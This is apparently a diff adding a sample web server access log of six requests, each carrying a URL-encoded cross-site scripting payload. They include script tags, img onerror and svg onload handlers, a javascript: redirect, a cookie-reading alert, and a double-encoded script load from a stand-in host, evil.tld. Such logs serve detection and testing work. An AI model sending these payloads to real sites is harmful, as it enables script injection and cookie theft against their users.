@@ -1,0 +1,6 @@
+203.0.113.70 - - [15/Aug/2026:11:10:00 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 4210 "-" "Mozilla/5.0"
+203.0.113.70 - - [15/Aug/2026:11:10:05 +0000] "GET /profile?bio=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E HTTP/1.1" 200 3300 "-" "Mozilla/5.0"
+203.0.113.70 - - [15/Aug/2026:11:10:09 +0000] "GET /redirect?to=javascript%3Aalert(1) HTTP/1.1" 302 0 "-" "Mozilla/5.0"
+203.0.113.70 - - [15/Aug/2026:11:10:14 +0000] "GET /search?q=%2527%253E%253Cscript%2520src%253D//evil.tld/x.js%253E%253C/script%253E HTTP/1.1" 200 4100 "-" "Mozilla/5.0"
+203.0.113.70 - - [15/Aug/2026:11:10:19 +0000] "GET /page?tpl=%3Csvg%20onload%3Dalert(1)%3E HTTP/1.1" 200 2800 "-" "Mozilla/5.0"
+203.0.113.71 - - [15/Aug/2026:11:10:24 +0000] "POST /comment?text=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E HTTP/1.1" 201 120 "-" "Mozilla/5.0"
